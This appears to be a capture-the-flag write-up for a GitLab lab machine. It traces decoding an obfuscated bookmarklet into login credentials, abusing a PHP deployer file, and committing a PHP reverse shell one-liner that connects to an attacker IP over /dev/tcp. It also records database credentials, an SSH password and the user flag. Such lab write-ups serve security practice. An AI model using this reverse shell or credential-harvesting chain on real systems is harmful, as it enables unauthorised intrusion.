# Port 80 - Gitlab
## Exploring the gitlab directory manage to come across a hidden bookmarks link
 - http://10.10.10.114/help/bookmarks.html
### A Gitlab Login Link contains the text
```
javascript:(function(){
	%20var%20_0x4b18=["\x76\x61\x6C\x75\x65",
			"\x75\x73\x65\x72\x5F\x6C\x6F\x67\x69\x6E",
			"\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x42\x79\x49\x64",
			"\x63\x6C\x61\x76\x65",
			"\x75\x73\x65\x72\x5F\x70\x61\x73\x73\x77\x6F\x72\x64",
			"\x31\x31\x64\x65\x73\x30\x30\x38\x31\x78"];
	document[_0x4b18[2]](_0x4b18[1])
		[_0x4b18[0]]=%20_0x4b18[3];
	document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]=%20_0x4b18[5];
	%20})()
```
- This is unusual

```
javascript:(function(){
        var _0x4b18=["value",
                        "user_login",
                        "getElementById",
                        "clave",
                        "user_password",
                        "11des0081x"];
        document[_0x4b18[2]](_0x4b18[1])
                [_0x4b18[0]]= _0x4b18[3];
        document[_0x4b18[2]](_0x4b18[4])[_0x4b18[0]]=%20_0x4b18[5]; })()

```

#### Username: clave
#### Password: 11des0081x

## Login as user clave into gitlab
 - Upon loggin in we are presented with two projects
	* Administrator/ Profile (Developer)
	* Administrator/ Deployer (Reporter)

### http://10.10.10.114/root/profile
 - Files in the repo
	* README.md
	* developer.jpg
	* index.php

### http://10.10.10.114/root/deployer
 - Files in the repo
	* README.md
	* index.php
		- **NOTE** this php file contains shell_exec() --> we can exploit

#### I can access these files by going to http://10.10.10.114/deployer/index.php for example
 1) The php executes and we get an OK as expected by the echo "OK" in index.php
	* Now to figure out code execution
 2) file_get_contents("php://input");
	* Allows for posting json data 

## Off course, simple php reverse shell one liner does the job.
### Commited to gitlab on index.php in the project profile

```php
exec("/bin/bash -c 'bash -i > /dev/tcp/10.10.15.4/1895 0>&1'");
```
- Popped a shell and moving forwards onto user

## PostgreSQL
### On the gitlabs page under Snippets the following code is displayed
- http://10.10.10.114/snippets/1

```
<?php
$db_connection = pg_connect("host=localhost dbname=profiles user=profiles password=profiles");
$result = pg_query($db_connection, "SELECT * FROM profiles");

```
#### Username: profiles
#### Password: profiles

## Connecting to postgres via forwarded port?
### netstat -pant output
```
tcp        0      0 127.0.0.1:3022          0.0.0.0:*               LISTEN      
-                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      
-                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      
-                   
tcp        0      0 172.17.0.1:3000         0.0.0.0:*               LISTEN      
-                   
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN    
```

- We know based on the above php code that the postgresql server is running on local host
	* therefore we can assume that either port 53 or 5432 is hosting the server
	* port 3000 is also something to note. It's on a completely different subnet, but there are still connections to it

## Answer was php script in snippets
### Paste the code and exit it to select the proper row
Go to the page under 10.10.10.114/profile/db.php

-c3NoLXN0cjBuZy1wQHNz==
	* looks like base64 but thats his ssh password --> maybe a messup
-user.txt --> 1e3fd81ec3aa2f1462370ee3c20b8154
